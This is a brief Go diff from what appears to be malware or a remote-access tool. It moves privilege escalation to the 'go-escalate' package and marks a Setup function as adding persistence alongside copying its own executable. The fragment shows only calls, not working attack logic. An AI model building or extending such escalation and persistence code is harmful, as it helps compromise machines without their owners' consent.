@@ -8,6 +8,8 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+
+	"github.com/lu4p/go-escalate"
 )
 
 func copyExecuteable() error {
@@ -31,7 +33,7 @@ func Elevate() error {
 	if err != nil {
 		return errors.New("Copy failed")
 	}
-	return Escalate(PathExe)
+	return escalate.Escalate(PathExe)
 }
 
 // CheckSetup check wheter already configured
@@ -48,6 +50,7 @@ func CheckSetup() bool {
 	return false
 }
 
+// Setup add Persitence
 func Setup() {
 	log.Println("Setup")
 	go Persist(PathExe)
